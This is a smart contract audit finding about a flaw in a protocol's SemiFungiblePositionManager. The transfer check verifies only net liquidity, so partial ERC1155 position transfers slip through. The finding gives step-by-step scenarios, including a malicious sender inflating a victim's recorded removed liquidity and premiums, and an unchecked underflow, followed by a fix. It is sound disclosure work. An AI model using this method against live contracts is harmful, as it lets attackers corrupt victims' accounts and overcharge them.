[H-02] Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be

The positions in this protocol are ERC1155 tokens and they can be minted or burned.
Token transfers areextremely limitedin the protocol:
The sender must transfer all of its liquidity.The recipient must not have a position in that tick range and token type.
Users’ current liquidity in their positions is tracked with a storage variable calleds_accountLiquidity. This mappingis overwritten during transfers and the whole value is transferred. The reason for not allowing partial transfers is that partial transfers will mess up the whole storage updating mechanism.
The requirements mentioned above are checkedhere:
file:SemiFungiblePositionManager.sol// function registerTokenTransfer// ...// Revert if recipient already has that positionif((s_accountLiquidity[positionKey_to] !=0) ||(s_accountFeesBase[positionKey_to] !=0))revertErrors.TransferFailed();// Revert if not all balance is transferreduint256fromLiq=s_accountLiquidity[positionKey_from];-->if(fromLiq.rightSlot() !=liquidityChunk.liquidity())revertErrors.TransferFailed();//@audit if the right slot is equal to transferred liquidity, it will pass. There is no check related to left slot.// ... more code
The check related to whether all balance is transferred or not is made by checking the right slot of the sender’s liquidity usingfromLiq.rightSlot(). Right now, I want to point out there is no check related to the left slot. I’ll get there later.
Now, we have to understand how position keys are constructed, and how the left slot and right slot work. Let’s start with the positionkeys:
//construct the positionKey for the from and to addressesbytes32positionKey_from=keccak256(abi.encodePacked(address(univ3pool),from,id.tokenType(leg),liquidityChunk.tickLower(),liquidityChunk.tickUpper())
They are constructed with pool address, user address, token type, lower tick and upper tick. The most important thing I want to mention here is that whether the position islong or short is not in the position key. The thing that matters is thetoken type (put or call). Which means:
Short putandLong putorders have the same position key (for the same tick range) but different token IDs.
The second thing we need to know is theleft and right slot mechanism:
/*       removed liquidity r          net liquidity N=(T-R)* |<------- 128 bits ------->|<------- 128 bits ------->|* |<---------------------- 256 bits ------------------->|*/////// @dev mapping that stores the liquidity data of keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))// liquidityData is a LeftRight. The right slot represents the liquidity currently sold (added) in the AMM owned by the user// the left slot represents the amount of liquidity currently bought (removed) that has been removed from the AMM - the user owes it to a seller// the reason why it is called "removedLiquidity" is because long options are created by removed liquidity -ie. short selling LP positions
The left slot holds the removed liquidity values and the right slot holds the net liquidity values.
These values are updated in the_createLegInAMMduring minting and burning depending on whether the action isshort or long or mint or burn etc.
As I mentioned above, only theright slotis checked during transfers. If a user mints a short put (deposits tokens), and then mints a long put (withdraws tokens) in the same ticks, the right slot will be a very small number but the user will have two different ERC1155 tokens(token Ids are different for short and long positions, but position key is the same). Then that user can transfer just the partial amount of short put tokens that correspond to the right slot.
I’ll provide two different scenarios here where the sender is malicious in one of them, and a naive user in another one. You can also find a coded PoC below that shows all of these scenarios.
Scenario 1: Alice(sender) is a malicious user
Alice mints 100Short puttokens.//NOTE: The liquidity is different than the token amounts but I'm sharing like this just to make easy/*|---left slot: removed liq---|---right slot: added liq---||           0                |            100            |Alice mints 90Long puttokens in the same ticks (not burn)./*|---left slot: removed liq---|---right slot: added liq---||           90               |             10            |At this moment Alice has 100 short put tokens and 90 long put tokens (tokenIds are different but theposition keyis the same).Alice transfers only 10 short put tokens to Bob. This transaction succeeds as the 10 short put token liquidity is the same as Alice’s right slot liquidity. (The net liquidity is totally transferred).After the transfer, Alice still has 90 short put tokens and 90 long put tokens but Alice’ss_accountLiquiditystorage variable is updated to 0.At this moment Bob only has 10 short put tokens. However, the storage is updated. Bob didn’t remove any tokens but hiss_accountLiquidityleft slot is 90, and it looks like Bob has removed 90 tokens./*|---left slot: removed liq---|---right slot: added liq---||           90               |             10            |
There are two big problems here:
Bob has no way to update hisremovedLiquidityvariable other than burning long put tokens. However, he doesn’t have these tokens. They are still in Alice’s wallet.All of Bob’s account premiums and owed premiums are calculated based on the ratio of removed, net and total liquidity. All of his account premiums for that option will be completely incorrect. Seehere.
Now imagine a malicious user minting a huge amount of short put (deposit), minting 99% of that amount of long put (withdraw), and transferring that 1% to the victim. It’s basically setting traps for the victim by transferring tiny amount ofnetliquidities. The victim’s account looks like he removed a lot of liquidity, and if the victim mints positions in the same range in the future, theowed premiumsfor this position will be extremely different, and much higher than it should be.
Scenario 2: Alice (sender) is a naive user
The initial steps are the same as those above. Alice is just a regular user.
Alice mints 100 short putThen mints 90 long put.Alice knows she has some liquidity left and transfers 10 short put tokens to her friend.Right now, Alice has 90 short put tokens and 90 long put tokens. Her account liquidity is overwritten and updated to 0, but she doesn’t know that. She is just a regular user. From her perspective, she still has these 90 short put and 90 long put tokens in her wallet.Alice wants to burn her tokens (she has to burn the long ones first).Alice burns 90 long put tokens.
SemiFungiblePositionManager.sol#L961C9-L980C18
```solidityunchecked {//...uint128 startingLiquidity = currentLiquidity.rightSlot();uint128 removedLiquidity = currentLiquidity.leftSlot();uint128 chunkLiquidity = _liquidityChunk.liquidity();if (isLong == 0) {// selling/short: so move from msg.sender *to* uniswap// we're minting more liquidity in uniswap: so add the incoming liquidity chunk to the existing liquidity chunkupdatedLiquidity = startingLiquidity + chunkLiquidity;/// @dev If the isLong flag is 0=short but the position was burnt, then this is closing a long position/// @dev so the amount of short liquidity should decrease.if (_isBurn) {979.-->            removedLiquidity -= chunkLiquidity; //@audit her removedLiquidity was 0, but this is inside the unchecked block. Now her removed liquidity is a huge number.```
Alice’s account liquidity storage was updated before (step 4) andremovedLiquiditywas 0. After burning her long put tokens, the newremovedLiquidity(L979 above) will be an enormous number since it is inside the unchecked block.
Right now, Alice looks like she removed an unbelievably huge amount of liquidity and she messed up her account (but she didn’t do anything wrong).
Impact
Partial transfers are still possible since the function only checks whether the net liquidity (right slot) is transferred.This will disrupt the whole storage updates related to account liquidities.Malicious users might transfer a tiny bit of their balance, and cause the recipient to pay much more premium.Naive users might unintentionally mess up their accounts.

Recommended Mitigation Steps
At the moment, the protocol checks if the wholenet liquidityis transferred by checking the right slot. However, this restriction is not enough and the situation of the left slot is not checked at all.
The transfer restriction should be widened and users should not be able to transfer if their removed liquidity (left slot) is greater than zero.
